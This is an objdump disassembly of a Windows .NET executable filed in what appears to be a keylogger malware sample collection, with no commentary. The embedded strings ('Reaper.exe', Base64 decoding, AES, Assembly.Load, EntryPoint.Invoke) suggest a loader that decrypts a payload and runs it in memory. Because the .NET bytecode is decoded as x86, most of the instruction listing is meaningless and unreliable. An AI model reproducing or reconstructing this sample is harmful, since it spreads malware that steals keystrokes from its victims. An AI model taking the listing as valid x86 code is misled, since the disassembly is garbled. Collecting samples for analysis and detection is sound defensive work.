
malware_samples/keylogger/f925e2d67bf1c35afc832e947dc03216bf562c7e545f92f2e79785bb81443509.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	90                   	nop
  402001:	cd 00                	int    $0x0
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 84 21 00       	add    $0x218400,%eax
  402013:	00 dc                	add    %bl,%ah
  402015:	ab                   	stos   %eax,%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	03 00                	add    (%eax),%eax
  402054:	76 00                	jbe    0x402056
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	20 00                	and    %al,(%eax)
  40205e:	0c 00                	or     $0x0,%al
  402060:	00 28                	add    %ch,(%eax)
  402062:	04 00                	add    $0x0,%al
  402064:	00 0a                	add    %cl,(%edx)
  402066:	20 d0                	and    %dl,%al
  402068:	07                   	pop    %es
  402069:	00 00                	add    %al,(%eax)
  40206b:	28 05 00 00 0a 7e    	sub    %al,0x7e0a0000
  402071:	03 00                	add    (%eax),%eax
  402073:	00 04 28             	add    %al,(%eax,%ebp,1)
  402076:	06                   	push   %es
  402077:	00 00                	add    %al,(%eax)
  402079:	0a 7e 01             	or     0x1(%esi),%bh
  40207c:	00 00                	add    %al,(%eax)
  40207e:	04 7e                	add    $0x7e,%al
  402080:	02 00                	add    (%eax),%al
  402082:	00 04 28             	add    %al,(%eax,%ebp,1)
  402085:	02 00                	add    (%eax),%al
  402087:	00 06                	add    %al,(%esi)
  402089:	0a 06                	or     (%esi),%al
  40208b:	28 07                	sub    %al,(%edi)
  40208d:	00 00                	add    %al,(%eax)
  40208f:	0a 0b                	or     (%ebx),%cl
  402091:	07                   	pop    %es
  402092:	6f                   	outsl  %ds:(%esi),(%dx)
  402093:	08 00                	or     %al,(%eax)
  402095:	00 0a                	add    %cl,(%edx)
  402097:	0c 08                	or     $0x8,%al
  402099:	14 28                	adc    $0x28,%al
  40209b:	09 00                	or     %eax,(%eax)
  40209d:	00 0a                	add    %cl,(%edx)
  40209f:	2c 2b                	sub    $0x2b,%al
  4020a1:	08 6f 0a             	or     %ch,0xa(%edi)
  4020a4:	00 00                	add    %al,(%eax)
  4020a6:	0a 8e 69 2c 16 17    	or     0x17162c69(%esi),%cl
  4020ac:	8d 01                	lea    (%ecx),%eax
  4020ae:	00 00                	add    %al,(%eax)
  4020b0:	01 13                	add    %edx,(%ebx)
  4020b2:	04 11                	add    $0x11,%al
  4020b4:	04 16                	add    $0x16,%al
  4020b6:	16                   	push   %ss
  4020b7:	8d 0d 00 00 01 a2    	lea    0xa2010000,%ecx
  4020bd:	11 04 2b             	adc    %eax,(%ebx,%ebp,1)
  4020c0:	01 14 0d 08 14 09 6f 	add    %edx,0x6f091408(,%ecx,1)
  4020c7:	0b 00                	or     (%eax),%eax
  4020c9:	00 0a                	add    %cl,(%edx)
  4020cb:	26 de 03             	fiadds %es:(%ebx)
  4020ce:	26 de 00             	fiadds %es:(%eax)
  4020d1:	2a 00                	sub    (%eax),%al
  4020d3:	00 01                	add    %al,(%ecx)
  4020d5:	10 00                	adc    %al,(%eax)
  4020d7:	00 00                	add    %al,(%eax)
  4020d9:	00 00                	add    %al,(%eax)
  4020db:	00 72 72             	add    %dh,0x72(%edx)
  4020de:	00 03                	add    %al,(%ebx)
  4020e0:	01 00                	add    %eax,(%eax)
  4020e2:	00 01                	add    %al,(%ecx)
  4020e4:	1b 30                	sbb    (%eax),%esi
  4020e6:	04 00                	add    $0x0,%al
  4020e8:	57                   	push   %edi
  4020e9:	00 00                	add    %al,(%eax)
  4020eb:	00 02                	add    %al,(%edx)
  4020ed:	00 00                	add    %al,(%eax)
  4020ef:	11 28                	adc    %ebp,(%eax)
  4020f1:	0c 00                	or     $0x0,%al
  4020f3:	00 0a                	add    %cl,(%edx)
  4020f5:	0a 06                	or     (%esi),%al
  4020f7:	03 28                	add    (%eax),%ebp
  4020f9:	06                   	push   %es
  4020fa:	00 00                	add    %al,(%eax)
  4020fc:	0a 6f 0d             	or     0xd(%edi),%ch
  4020ff:	00 00                	add    %al,(%eax)
  402101:	0a 06                	or     (%esi),%al
  402103:	04 28                	add    $0x28,%al
  402105:	06                   	push   %es
  402106:	00 00                	add    %al,(%eax)
  402108:	0a 6f 0e             	or     0xe(%edi),%ch
  40210b:	00 00                	add    %al,(%eax)
  40210d:	0a 06                	or     (%esi),%al
  40210f:	17                   	pop    %ss
  402110:	6f                   	outsl  %ds:(%esi),(%dx)
  402111:	0f 00 00             	sldt   (%eax)
  402114:	0a 06                	or     (%esi),%al
  402116:	18 6f 10             	sbb    %ch,0x10(%edi)
  402119:	00 00                	add    %al,(%eax)
  40211b:	0a 06                	or     (%esi),%al
  40211d:	6f                   	outsl  %ds:(%esi),(%dx)
  40211e:	11 00                	adc    %eax,(%eax)
  402120:	00 0a                	add    %cl,(%edx)
  402122:	0b 07                	or     (%edi),%eax
  402124:	02 16                	add    (%esi),%dl
  402126:	02 8e 69 6f 12 00    	add    0x126f69(%esi),%cl
  40212c:	00 0a                	add    %cl,(%edx)
  40212e:	0c de                	or     $0xde,%al
  402130:	14 07                	adc    $0x7,%al
  402132:	2c 06                	sub    $0x6,%al
  402134:	07                   	pop    %es
  402135:	6f                   	outsl  %ds:(%esi),(%dx)
  402136:	13 00                	adc    (%eax),%eax
  402138:	00 0a                	add    %cl,(%edx)
  40213a:	dc 06                	faddl  (%esi)
  40213c:	2c 06                	sub    $0x6,%al
  40213e:	06                   	push   %es
  40213f:	6f                   	outsl  %ds:(%esi),(%dx)
  402140:	13 00                	adc    (%eax),%eax
  402142:	00 0a                	add    %cl,(%edx)
  402144:	dc 08                	fmull  (%eax)
  402146:	2a 00                	sub    (%eax),%al
  402148:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40214b:	00 02                	add    %al,(%edx)
  40214d:	00 33                	add    %dh,(%ebx)
  40214f:	00 0e                	add    %cl,(%esi)
  402151:	41                   	inc    %ecx
  402152:	00 0a                	add    %cl,(%edx)
  402154:	00 00                	add    %al,(%eax)
  402156:	00 00                	add    %al,(%eax)
  402158:	02 00                	add    (%eax),%al
  40215a:	06                   	push   %es
  40215b:	00 45 4b             	add    %al,0x4b(%ebp)
  40215e:	00 0a                	add    %cl,(%edx)
  402160:	00 00                	add    %al,(%eax)
  402162:	00 00                	add    %al,(%eax)
  402164:	7e 72                	jle    0x4021d8
  402166:	01 00                	add    %eax,(%eax)
  402168:	00 70 80             	add    %dh,-0x80(%eax)
  40216b:	01 00                	add    %eax,(%eax)
  40216d:	00 04 72             	add    %al,(%edx,%esi,2)
  402170:	5b                   	pop    %ebx
  402171:	00 00                	add    %al,(%eax)
  402173:	70 80                	jo     0x4020f5
  402175:	02 00                	add    (%eax),%al
  402177:	00 04 72             	add    %al,(%edx,%esi,2)
  40217a:	8d 00                	lea    (%eax),%eax
  40217c:	00 70 80             	add    %dh,-0x80(%eax)
  40217f:	03 00                	add    (%eax),%eax
  402181:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402184:	42                   	inc    %edx
  402185:	53                   	push   %ebx
  402186:	4a                   	dec    %edx
  402187:	42                   	inc    %edx
  402188:	01 00                	add    %eax,(%eax)
  40218a:	01 00                	add    %eax,(%eax)
  40218c:	00 00                	add    %al,(%eax)
  40218e:	00 00                	add    %al,(%eax)
  402190:	0c 00                	or     $0x0,%al
  402192:	00 00                	add    %al,(%eax)
  402194:	76 34                	jbe    0x4021ca
  402196:	2e 30 2e             	xor    %ch,%cs:(%esi)
  402199:	33 30                	xor    (%eax),%esi
  40219b:	33 31                	xor    (%ecx),%esi
  40219d:	39 00                	cmp    %eax,(%eax)
  40219f:	00 00                	add    %al,(%eax)
  4021a1:	00 05 00 6c 00 00    	add    %al,0x6c00
  4021a7:	00 f4                	add    %dh,%ah
  4021a9:	01 00                	add    %eax,(%eax)
  4021ab:	00 23                	add    %ah,(%ebx)
  4021ad:	7e 00                	jle    0x4021af
  4021af:	00 60 02             	add    %ah,0x2(%eax)
  4021b2:	00 00                	add    %al,(%eax)
  4021b4:	98                   	cwtl
  4021b5:	02 00                	add    (%eax),%al
  4021b7:	00 23                	add    %ah,(%ebx)
  4021b9:	53                   	push   %ebx
  4021ba:	74 72                	je     0x40222e
  4021bc:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  4021c3:	00 f8                	add    %bh,%al
  4021c5:	04 00                	add    $0x0,%al
  4021c7:	00 14 a6             	add    %dl,(%esi,%eiz,4)
  4021ca:	00 00                	add    %al,(%eax)
  4021cc:	23 55 53             	and    0x53(%ebp),%edx
  4021cf:	00 0c ab             	add    %cl,(%ebx,%ebp,4)
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 00                	add    %al,(%eax)
  4021d8:	23 47 55             	and    0x55(%edi),%eax
  4021db:	49                   	dec    %ecx
  4021dc:	44                   	inc    %esp
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	00 1c ab             	add    %bl,(%ebx,%ebp,4)
  4021e2:	00 00                	add    %al,(%eax)
  4021e4:	c0 00 00             	rolb   $0x0,(%eax)
  4021e7:	00 23                	add    %ah,(%ebx)
  4021e9:	42                   	inc    %edx
  4021ea:	6c                   	insb   (%dx),%es:(%edi)
  4021eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ec:	62 00                	bound  %eax,(%eax)
  4021ee:	00 00                	add    %al,(%eax)
  4021f0:	00 00                	add    %al,(%eax)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	02 00                	add    (%eax),%al
  4021f6:	00 01                	add    %al,(%ecx)
  4021f8:	57                   	push   %edi
  4021f9:	15 02 00 09 00       	adc    $0x90002,%eax
  4021fe:	00 00                	add    %al,(%eax)
  402200:	00 fa                	add    %bh,%dl
  402202:	25 33 00 16 00       	and    $0x160033,%eax
  402207:	00 01                	add    %al,(%ecx)
  402209:	00 00                	add    %al,(%eax)
  40220b:	00 13                	add    %dl,(%ebx)
  40220d:	00 00                	add    %al,(%eax)
  40220f:	00 02                	add    %al,(%edx)
  402211:	00 00                	add    %al,(%eax)
  402213:	00 03                	add    %al,(%ebx)
  402215:	00 00                	add    %al,(%eax)
  402217:	00 03                	add    %al,(%ebx)
  402219:	00 00                	add    %al,(%eax)
  40221b:	00 03                	add    %al,(%ebx)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	00 13                	add    %dl,(%ebx)
  402221:	00 00                	add    %al,(%eax)
  402223:	00 03                	add    %al,(%ebx)
  402225:	00 00                	add    %al,(%eax)
  402227:	00 02                	add    %al,(%edx)
  402229:	00 00                	add    %al,(%eax)
  40222b:	00 01                	add    %al,(%ecx)
  40222d:	00 00                	add    %al,(%eax)
  40222f:	00 02                	add    %al,(%edx)
  402231:	00 00                	add    %al,(%eax)
  402233:	00 00                	add    %al,(%eax)
  402235:	00 0a                	add    %cl,(%edx)
  402237:	00 01                	add    %al,(%ecx)
  402239:	00 00                	add    %al,(%eax)
  40223b:	00 00                	add    %al,(%eax)
  40223d:	00 06                	add    %al,(%esi)
  40223f:	00 37                	add    %dh,(%edi)
  402241:	00 30                	add    %dh,(%eax)
  402243:	00 06                	add    %al,(%esi)
  402245:	00 76 00             	add    %dh,0x0(%esi)
  402248:	56                   	push   %esi
  402249:	00 06                	add    %al,(%esi)
  40224b:	00 9c 00 56 00 06 00 	add    %bl,0x60056(%eax,%eax,1)
  402252:	c1 00 30             	roll   $0x30,(%eax)
  402255:	00 0a                	add    %cl,(%edx)
  402257:	00 df                	add    %bl,%bh
  402259:	00 d4                	add    %dl,%ah
  40225b:	00 0a                	add    %cl,(%edx)
  40225d:	00 f3                	add    %dh,%bl
  40225f:	00 d4                	add    %dl,%ah
  402261:	00 06                	add    %al,(%esi)
  402263:	00 2e                	add    %ch,(%esi)
  402265:	01 1d 01 06 00 3b    	add    %ebx,0x3b000601
  40226b:	01 30                	add    %esi,(%eax)
  40226d:	00 06                	add    %al,(%esi)
  40226f:	00 66 01             	add    %ah,0x1(%esi)
  402272:	54                   	push   %esp
  402273:	01 06                	add    %eax,(%esi)
  402275:	00 74 01 54          	add    %dh,0x54(%ecx,%eax,1)
  402279:	01 06                	add    %eax,(%esi)
  40227b:	00 9c 01 54 01 06 00 	add    %bl,0x60154(%ecx,%eax,1)
  402282:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402283:	01 54 01 06          	add    %edx,0x6(%ecx,%eax,1)
  402287:	00 c3                	add    %al,%bl
  402289:	01 30                	add    %esi,(%eax)
  40228b:	00 06                	add    %al,(%esi)
  40228d:	00 ee                	add    %ch,%dh
  40228f:	01 d1                	add    %edx,%ecx
  402291:	01 06                	add    %eax,(%esi)
  402293:	00 f9                	add    %bh,%cl
  402295:	01 d1                	add    %edx,%ecx
  402297:	01 06                	add    %eax,(%esi)
  402299:	00 1b                	add    %bl,(%ebx)
  40229b:	02 d1                	add    %cl,%dl
  40229d:	01 06                	add    %eax,(%esi)
  40229f:	00 2f                	add    %ch,(%edi)
  4022a1:	02 d1                	add    %cl,%dl
  4022a3:	01 06                	add    %eax,(%esi)
  4022a5:	00 47 02             	add    %al,0x2(%edi)
  4022a8:	d1 01                	roll   $1,(%ecx)
  4022aa:	06                   	push   %es
  4022ab:	00 7c 02 30          	add    %bh,0x30(%edx,%eax,1)
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	00 00                	add    %al,(%eax)
  4022b3:	00 01                	add    %al,(%ecx)
  4022b5:	00 00                	add    %al,(%eax)
  4022b7:	00 00                	add    %al,(%eax)
  4022b9:	00 01                	add    %al,(%ecx)
  4022bb:	00 01                	add    %al,(%ecx)
  4022bd:	00 80 01 10 00 15    	add    %al,0x15001001(%eax)
  4022c3:	00 1e                	add    %bl,(%esi)
  4022c5:	00 05 00 01 00 01    	add    %al,0x1000100
  4022cb:	00 11                	add    %dl,(%ecx)
  4022cd:	00 3e                	add    %bh,(%esi)
  4022cf:	00 0a                	add    %cl,(%edx)
  4022d1:	00 11                	add    %dl,(%ecx)
  4022d3:	00 40 00             	add    %al,0x0(%eax)
  4022d6:	0a 00                	or     (%eax),%al
  4022d8:	11 00                	adc    %eax,(%eax)
  4022da:	42                   	inc    %edx
  4022db:	00 0a                	add    %cl,(%edx)
  4022dd:	00 50 20             	add    %dl,0x20(%eax)
  4022e0:	00 00                	add    %al,(%eax)
  4022e2:	00 00                	add    %al,(%eax)
  4022e4:	91                   	xchg   %eax,%ecx
  4022e5:	00 44 00 0d          	add    %al,0xd(%eax,%eax,1)
  4022e9:	00 01                	add    %al,(%ecx)
  4022eb:	00 e4                	add    %ah,%ah
  4022ed:	20 00                	and    %al,(%eax)
  4022ef:	00 00                	add    %al,(%eax)
  4022f1:	00 91 00 49 00 11    	add    %dl,0x11004900(%ecx)
  4022f7:	00 01                	add    %al,(%ecx)
  4022f9:	00 64 21 00          	add    %ah,0x0(%ecx,%eiz,1)
  4022fd:	00 00                	add    %al,(%eax)
  4022ff:	00 91 18 90 02 0d    	add    %dl,0xd029018(%ecx)
  402305:	00 04 00             	add    %al,(%eax,%eax,1)
  402308:	00 00                	add    %al,(%eax)
  40230a:	01 00                	add    %eax,(%eax)
  40230c:	4d                   	dec    %ebp
  40230d:	00 00                	add    %al,(%eax)
  40230f:	00 02                	add    %al,(%edx)
  402311:	00 52 00             	add    %dl,0x0(%edx)
  402314:	00 00                	add    %al,(%eax)
  402316:	03 00                	add    (%eax),%eax
  402318:	54                   	push   %esp
  402319:	00 11                	add    %dl,(%ecx)
  40231b:	00 96 00 1a 00 19    	add    %dl,0x19001a00(%esi)
  402321:	00 96 00 1f 00 21    	add    %dl,0x21001f00(%esi)
  402327:	00 96 00 1f 00 29    	add    %dl,0x29001f00(%esi)
  40232d:	00 08                	add    %cl,(%eax)
  40232f:	01 28                	add    %ebp,(%eax)
  402331:	00 39                	add    %bh,(%ecx)
  402333:	00 35 01 2e 00 41    	add    %dh,0x41002e01
  402339:	00 43 01             	add    %al,0x1(%ebx)
  40233c:	33 00                	xor    (%eax),%eax
  40233e:	49                   	dec    %ecx
  40233f:	00 6f 01             	add    %ch,0x1(%edi)
  402342:	39 00                	cmp    %eax,(%eax)
  402344:	49                   	dec    %ecx
  402345:	00 7f 01             	add    %bh,0x1(%edi)
  402348:	40                   	inc    %eax
  402349:	00 51 00             	add    %dl,0x0(%ecx)
  40234c:	8e 01                	mov    (%ecx),%es
  40234e:	45                   	inc    %ebp
  40234f:	00 59 00             	add    %bl,0x0(%ecx)
  402352:	b5 01                	mov    $0x1,%ch
  402354:	4d                   	dec    %ebp
  402355:	00 59 00             	add    %bl,0x0(%ecx)
  402358:	ca 01 53             	lret   $0x5301
  40235b:	00 71 00             	add    %dh,0x0(%ecx)
  40235e:	f2 01 67 00          	repnz add %esp,0x0(%edi)
  402362:	79 00                	jns    0x402364
  402364:	0c 02                	or     $0x2,%al
  402366:	6c                   	insb   (%dx),%es:(%edi)
  402367:	00 79 00             	add    %bh,0x0(%ecx)
  40236a:	14 02                	adc    $0x2,%al
  40236c:	6c                   	insb   (%dx),%es:(%edi)
  40236d:	00 79 00             	add    %bh,0x0(%ecx)
  402370:	26 02 72 00          	add    %es:0x0(%edx),%dh
  402374:	79 00                	jns    0x402376
  402376:	3b 02                	cmp    (%edx),%eax
  402378:	78 00                	js     0x40237a
  40237a:	79 00                	jns    0x40237c
  40237c:	58                   	pop    %eax
  40237d:	02 7e 00             	add    0x0(%esi),%bh
  402380:	91                   	xchg   %eax,%ecx
  402381:	00 68 02             	add    %ch,0x2(%eax)
  402384:	83 00 99             	addl   $0xffffff99,(%eax)
  402387:	00 88 02 1f 00 20    	add    %cl,0x20001f02(%eax)
  40238d:	00 1b                	add    %bl,(%ebx)
  40238f:	00 23                	add    %ah,(%ebx)
  402391:	00 2e                	add    %ch,(%esi)
  402393:	00 0b                	add    %cl,(%ebx)
  402395:	00 95 00 2e 00 13    	add    %dl,0x13002e00(%ebp)
  40239b:	00 9e 00 5a 00 8c    	add    %bl,-0x73ffa600(%esi)
  4023a1:	00 04 80             	add    %al,(%eax,%eax,4)
	...
  4023b4:	ba 00 00 00 04       	mov    $0x4000000,%edx
	...
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	00 01                	add    %al,(%ecx)
  4023c5:	00 27                	add    %ah,(%edi)
  4023c7:	00 00                	add    %al,(%eax)
  4023c9:	00 00                	add    %al,(%eax)
  4023cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4023d6:	00 00                	add    %al,(%eax)
  4023d8:	01 00                	add    %eax,(%eax)
  4023da:	30 00                	xor    %al,(%eax)
	...
  4023e4:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%ecx,2)
  4023eb:	65 3e 00 52 65       	gs add %dl,%ds:0x65(%edx)
  4023f0:	61                   	popa
  4023f1:	70 65                	jo     0x402458
  4023f3:	72 2e                	jb     0x402423
  4023f5:	65 78 65             	gs js  0x40245d
  4023f8:	00 4d 45             	add    %cl,0x45(%ebp)
  4023fb:	70 68                	jo     0x402465
  4023fd:	4e                   	dec    %esi
  4023fe:	4c                   	dec    %esp
  4023ff:	73 46                	jae    0x402447
  402401:	00 44 4b 54          	add    %al,0x54(%ebx,%ecx,2)
  402405:	64 44                	fs inc %esp
  402407:	72 6c                	jb     0x402475
  402409:	69 00 6d 73 63 6f    	imul   $0x6f63736d,(%eax),%eax
  40240f:	72 6c                	jb     0x40247d
  402411:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  402418:	65 6d                	gs insl (%dx),%es:(%edi)
  40241a:	00 4f 62             	add    %cl,0x62(%edi)
  40241d:	6a 65                	push   $0x65
  40241f:	63 74 00 4b          	arpl   %esi,0x4b(%eax,%eax,1)
  402423:	00 49 00             	add    %cl,0x0(%ecx)
  402426:	50                   	push   %eax
  402427:	00 4d 61             	add    %cl,0x61(%ebp)
  40242a:	69 6e 00 44 65 63 00 	imul   $0x636544,0x0(%esi),%ebp
  402431:	64 61                	fs popa
  402433:	74 61                	je     0x402496
  402435:	00 6b 00             	add    %ch,0x0(%ebx)
  402438:	69 00 53 79 73 74    	imul   $0x74737953,(%eax),%eax
  40243e:	65 6d                	gs insl (%dx),%es:(%edi)
  402440:	2e 52                	cs push %edx
  402442:	75 6e                	jne    0x4024b2
  402444:	74 69                	je     0x4024af
  402446:	6d                   	insl   (%dx),%es:(%edi)
  402447:	65 2e 43             	gs cs inc %ebx
  40244a:	6f                   	outsl  %ds:(%esi),(%dx)
  40244b:	6d                   	insl   (%dx),%es:(%edi)
  40244c:	70 69                	jo     0x4024b7
  40244e:	6c                   	insb   (%dx),%es:(%edi)
  40244f:	65 72 53             	gs jb  0x4024a5
  402452:	65 72 76             	gs jb  0x4024cb
  402455:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  40245c:	6d                   	insl   (%dx),%es:(%edi)
  40245d:	70 69                	jo     0x4024c8
  40245f:	6c                   	insb   (%dx),%es:(%edi)
  402460:	61                   	popa
  402461:	74 69                	je     0x4024cc
  402463:	6f                   	outsl  %ds:(%esi),(%dx)
  402464:	6e                   	outsb  %ds:(%esi),(%dx)
  402465:	52                   	push   %edx
  402466:	65 6c                	gs insb (%dx),%es:(%edi)
  402468:	61                   	popa
  402469:	78 61                	js     0x4024cc
  40246b:	74 69                	je     0x4024d6
  40246d:	6f                   	outsl  %ds:(%esi),(%dx)
  40246e:	6e                   	outsb  %ds:(%esi),(%dx)
  40246f:	73 41                	jae    0x4024b2
  402471:	74 74                	je     0x4024e7
  402473:	72 69                	jb     0x4024de
  402475:	62 75 74             	bound  %esi,0x74(%ebp)
  402478:	65 00 2e             	add    %ch,%gs:(%esi)
  40247b:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40247f:	00 52 75             	add    %dl,0x75(%edx)
  402482:	6e                   	outsb  %ds:(%esi),(%dx)
  402483:	74 69                	je     0x4024ee
  402485:	6d                   	insl   (%dx),%es:(%edi)
  402486:	65 43                	gs inc %ebx
  402488:	6f                   	outsl  %ds:(%esi),(%dx)
  402489:	6d                   	insl   (%dx),%es:(%edi)
  40248a:	70 61                	jo     0x4024ed
  40248c:	74 69                	je     0x4024f7
  40248e:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402491:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402498:	69 
  402499:	62 75 74             	bound  %esi,0x74(%ebp)
  40249c:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4024a0:	61                   	popa
  4024a1:	70 65                	jo     0x402508
  4024a3:	72 00                	jb     0x4024a5
  4024a5:	53                   	push   %ebx
  4024a6:	54                   	push   %esp
  4024a7:	41                   	inc    %ecx
  4024a8:	54                   	push   %esp
  4024a9:	68 72 65 61 64       	push   $0x64616572
  4024ae:	41                   	inc    %ecx
  4024af:	74 74                	je     0x402525
  4024b1:	72 69                	jb     0x40251c
  4024b3:	62 75 74             	bound  %esi,0x74(%ebp)
  4024b6:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4024ba:	73 74                	jae    0x402530
  4024bc:	65 6d                	gs insl (%dx),%es:(%edi)
  4024be:	2e 4e                	cs dec %esi
  4024c0:	65 74 00             	gs je  0x4024c3
  4024c3:	53                   	push   %ebx
  4024c4:	65 72 76             	gs jb  0x40253d
  4024c7:	69 63 65 50 6f 69 6e 	imul   $0x6e696f50,0x65(%ebx),%esp
  4024ce:	74 4d                	je     0x40251d
  4024d0:	61                   	popa
  4024d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4024d2:	61                   	popa
  4024d3:	67 65 72 00          	addr16 gs jb 0x4024d7
  4024d7:	53                   	push   %ebx
  4024d8:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4024dc:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  4024e3:	6f 
  4024e4:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4024e7:	54                   	push   %esp
  4024e8:	79 70                	jns    0x40255a
  4024ea:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4024ee:	74 5f                	je     0x40254f
  4024f0:	53                   	push   %ebx
  4024f1:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4024f5:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  4024fc:	6f 
  4024fd:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  402500:	00 53 79             	add    %dl,0x79(%ebx)
  402503:	73 74                	jae    0x402579
  402505:	65 6d                	gs insl (%dx),%es:(%edi)
  402507:	2e 54                	cs push %esp
  402509:	68 72 65 61 64       	push   $0x64616572
  40250e:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  402515:	65 61                	gs popa
  402517:	64 00 53 6c          	add    %dl,%fs:0x6c(%ebx)
  40251b:	65 65 70 00          	gs gs jo 0x40251f
  40251f:	43                   	inc    %ebx
  402520:	6f                   	outsl  %ds:(%esi),(%dx)
  402521:	6e                   	outsb  %ds:(%esi),(%dx)
  402522:	76 65                	jbe    0x402589
  402524:	72 74                	jb     0x40259a
  402526:	00 46 72             	add    %al,0x72(%esi)
  402529:	6f                   	outsl  %ds:(%esi),(%dx)
  40252a:	6d                   	insl   (%dx),%es:(%edi)
  40252b:	42                   	inc    %edx
  40252c:	61                   	popa
  40252d:	73 65                	jae    0x402594
  40252f:	36 34 53             	ss xor $0x53,%al
  402532:	74 72                	je     0x4025a6
  402534:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40253b:	74 65                	je     0x4025a2
  40253d:	6d                   	insl   (%dx),%es:(%edi)
  40253e:	2e 52                	cs push %edx
  402540:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  402543:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402548:	6e                   	outsb  %ds:(%esi),(%dx)
  402549:	00 41 73             	add    %al,0x73(%ecx)
  40254c:	73 65                	jae    0x4025b3
  40254e:	6d                   	insl   (%dx),%es:(%edi)
  40254f:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  402553:	4c                   	dec    %esp
  402554:	6f                   	outsl  %ds:(%esi),(%dx)
  402555:	61                   	popa
  402556:	64 00 4d 65          	add    %cl,%fs:0x65(%ebp)
  40255a:	74 68                	je     0x4025c4
  40255c:	6f                   	outsl  %ds:(%esi),(%dx)
  40255d:	64 49                	fs dec %ecx
  40255f:	6e                   	outsb  %ds:(%esi),(%dx)
  402560:	66 6f                	outsw  %ds:(%esi),(%dx)
  402562:	00 67 65             	add    %ah,0x65(%edi)
  402565:	74 5f                	je     0x4025c6
  402567:	45                   	inc    %ebp
  402568:	6e                   	outsb  %ds:(%esi),(%dx)
  402569:	74 72                	je     0x4025dd
  40256b:	79 50                	jns    0x4025bd
  40256d:	6f                   	outsl  %ds:(%esi),(%dx)
  40256e:	69 6e 74 00 6f 70 5f 	imul   $0x5f706f00,0x74(%esi),%ebp
  402575:	49                   	dec    %ecx
  402576:	6e                   	outsb  %ds:(%esi),(%dx)
  402577:	65 71 75             	gs jno 0x4025ef
  40257a:	61                   	popa
  40257b:	6c                   	insb   (%dx),%es:(%edi)
  40257c:	69 74 79 00 4d 65 74 	imul   $0x6874654d,0x0(%ecx,%edi,2),%esi
  402583:	68 
  402584:	6f                   	outsl  %ds:(%esi),(%dx)
  402585:	64 42                	fs inc %edx
  402587:	61                   	popa
  402588:	73 65                	jae    0x4025ef
  40258a:	00 50 61             	add    %dl,0x61(%eax)
  40258d:	72 61                	jb     0x4025f0
  40258f:	6d                   	insl   (%dx),%es:(%edi)
  402590:	65 74 65             	gs je  0x4025f8
  402593:	72 49                	jb     0x4025de
  402595:	6e                   	outsb  %ds:(%esi),(%dx)
  402596:	66 6f                	outsw  %ds:(%esi),(%dx)
  402598:	00 47 65             	add    %al,0x65(%edi)
  40259b:	74 50                	je     0x4025ed
  40259d:	61                   	popa
  40259e:	72 61                	jb     0x402601
  4025a0:	6d                   	insl   (%dx),%es:(%edi)
  4025a1:	65 74 65             	gs je  0x402609
  4025a4:	72 73                	jb     0x402619
  4025a6:	00 53 74             	add    %dl,0x74(%ebx)
  4025a9:	72 69                	jb     0x402614
  4025ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4025ac:	67 00 49 6e          	add    %cl,0x6e(%bx,%di)
  4025b0:	76 6f                	jbe    0x402621
  4025b2:	6b 65 00 53          	imul   $0x53,0x0(%ebp),%esp
  4025b6:	79 73                	jns    0x40262b
  4025b8:	74 65                	je     0x40261f
  4025ba:	6d                   	insl   (%dx),%es:(%edi)
  4025bb:	2e 53                	cs push %ebx
  4025bd:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4025c1:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  4025c8:	70 
  4025c9:	74 6f                	je     0x40263a
  4025cb:	67 72 61             	addr16 jb 0x40262f
  4025ce:	70 68                	jo     0x402638
  4025d0:	79 00                	jns    0x4025d2
  4025d2:	41                   	inc    %ecx
  4025d3:	65 73 00             	gs jae 0x4025d6
